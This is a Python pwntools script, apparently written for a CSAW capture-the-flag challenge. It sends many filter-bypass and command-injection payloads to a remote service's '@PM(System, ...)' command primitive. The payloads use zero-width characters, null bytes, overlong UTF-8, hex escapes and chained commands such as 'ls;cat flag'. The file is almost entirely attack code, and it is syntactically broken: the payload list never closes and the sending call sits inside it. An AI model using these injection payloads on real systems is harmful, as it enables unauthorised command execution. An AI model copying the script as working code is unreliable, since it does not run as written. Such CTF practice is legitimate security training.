#!/usr/bin/env python3
from pwn import *
import time

def test_payload(payload):
    try:
        p = remote('pwn.chal.csaw.io', 4242)
        print(f"\nTesting: {repr(payload)}")
        p.sendline(payload)
        result = p.recvuntil(b'> ', timeout=1)
        print(f"Response: {result}")
        if b'flag{' in result:
            print(f"[!] Potential flag found!")
        p.close()
        time.sleep(0.5)
    except Exception as e:
        print(f"Error: {e}")
        if 'p' in locals():
            p.close()

def test_escape_sequences():
    payloads = [
        # Test Unicode normalization
        '@PM(\u200bSystem\u200b, "ls")',
        '@PM(\ufeffSystem\ufeff, "ls")',
        
        # Test UTF-16 surrogate pairs
        '@PM(\ud800\udc00System, "ls")',
        
        # Test mixed encodings
        '@PM(\x00Sys\u200btem, "ls")',
        '@PM(Sys\x00t\u200bem, "ls")',
        
        # Test escape sequence combinations
        '@PM(System, "\\x0a\\x0dls")',
        '@PM(System, "\\u000a\\u000dls")',
        '@PM(System, "\\x1b\\x5bls")',  # ANSI escape sequence
        
        # Test vertical whitespace
        '@PM(System\u2028, "ls")',
        '@PM(System\u2029, "ls")',
        
        # Test bidirectional text control
        '@PM(\u202eSystem\u202c, "ls")',
        '@PM(\u202dSystem\u202c, "ls")',
        
        # Test combining characters
        '@PM(S\u0307ystem, "ls")',
        '@PM(Sy\u0307stem, "ls")',
        
        # Test quote escaping with special chars
        '@PM(Sys\\x22tem, "ls")',
        '@PM(Sys\\x27tem, "ls")',
        
        # Test stacked escape sequences
        '@PM(\\x5c\\x78\\x30\\x30System, "ls")',
        '@PM(System, "\\x5c\\x78\\x30\\x30ls")',
        
        # Test alternative path traversal
        '@PM(System, ".%c2%afls")',
        '@PM(System, "..%c2%afls")',
        
        # Test zero-width spaces
        '@PM(\u200bS\u200by\u200bs\u200bt\u200be\u200bm\u200b, "ls")',
        
        # Test invalid UTF-8 sequences
        '@PM(\xffSystem, "ls")',
        '@PM(\xfe\xffSystem, "ls")',
        
        # Test overlong UTF-8 encodings
        '@PM(\xc0\x80System, "ls")',
        '@PM(\xe0\x80\x80System, "ls")',
        
        # Test format string with escape sequences
        '@PM(%s%x\\x00, "ls")',
        '@PM(System, "%s%x\\x00")',
        
        # Test command injection with escapes
        '@PM(System, "l\\x73;\\x63\\x61\\x74 flag")',
        '@PM(System, "l\\u0073;\\u0063\\u0061\\u0074 flag")',
        
        # Test null byte variants
        '@PM(\x00System\x00, "ls")',
        '@PM(System, "l\x00s")',
        '@PM(System, "l\\u0000s")',
        
        # Test UTF-7 style encoding
        '@PM(+AFMAFw-System, "ls")',
        '@PM(System, "+AFMAFw-ls")',
        
        # Test HTML entity-like sequences
        '@PM(System, "ls")',
        '@PM(System, "ls")',
        
        # Test mixed case hex escapes
        '@PM(\\x53\\X59\\x53\\X54\\x45\\X4d, "ls")',
        
        # Test multiple slashes
        '@PM(System, "\\\\\\\\ls")',
        '@PM(\\\\System, "ls")',
        
        # Test environment variable style
        '@PM($System, "ls")',
        '@PM(${System}, "ls")',
        '@PM(System, "$PATH")',
        
        # Test hex/octal combinations
        '@PM(System, "\\x6c\\163")',
        '@PM(System, "\\154\\x73")',

        test_payload(payload.encode('utf-8', errors='ignore'))
